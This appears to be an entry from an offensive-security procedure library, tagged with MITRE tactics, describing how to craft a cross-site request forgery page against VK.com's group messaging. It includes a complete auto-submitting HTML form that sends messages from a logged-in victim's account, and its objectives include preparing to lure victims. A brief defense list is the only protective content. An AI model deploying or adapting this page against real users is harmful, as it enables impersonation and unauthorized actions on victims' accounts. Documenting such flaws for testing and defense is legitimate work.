---
id: proc-vk-csrf-craft
tags:
  - csrf
  - exploit
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T17:27:42.732Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Craft Malicious CSRF Page for Group IM Actions

## Summary

This procedure creates a proof-of-concept webpage that uses the shared CSRF hash to submit unauthorized requests to VK.com's Group IM, performing actions like sending messages from a victim's account.

## Description

Exploiting the non-unique hash tied to group_id, craft an HTML form or JavaScript snippet that auto-submits a POST to /al_im.php?gid=XXX with the shared hash and action parameters (e.g., message content and peer_id). The page triggers on load, bypassing user intent. Test in a controlled environment before deployment; suitable for PHP web apps like VK.com.

## Requirements

1. Known shared hash value from analysis
2. Text editor (e.g., VS Code) and web server for hosting
3. Target group_id and desired action details

## Defense

Defensive measures and detection strategies:

- Enforce same-site cookies and user-specific tokens
- Scan for suspicious cross-origin requests to IM endpoints
- Rate-limit IM actions per user session

## Objectives

1. Build a functional CSRF PoC page
2. Verify it executes actions without interaction
3. Prepare for victim luring

## Instructions

### Step 1: Obtain Shared Hash

**Context**: Use the hash identified in prior analysis.

Retrieve the current timehash or static hash for the group_id.

### Step 2: Create HTML Form

**Context**: Design a simple form that auto-submits on page load.

In a text editor, write:

```html
<!DOCTYPE html>
<html>
<body>
<form id="csrf" action="https://vk.com/al_im.php?gid=XXX" method="POST">
<input type="hidden" name="hash" value="SHARED_HASH_HERE">
<input type="hidden" name="act" value="a_send">
<input type="hidden" name="peer_id" value="TARGET_PEER_ID">
<input type="hidden" name="msg" value="Malicious message content">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>
```
Replace placeholders with actual values.

### Step 3: Test the PoC

**Context**: Validate functionality in your own session.

Host the page locally (e.g., via Python's http.server) and visit while logged into VK.com. Confirm the action (e.g., message sent) occurs automatically.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[csrf]]
- [[exploit]]
- [[web]]
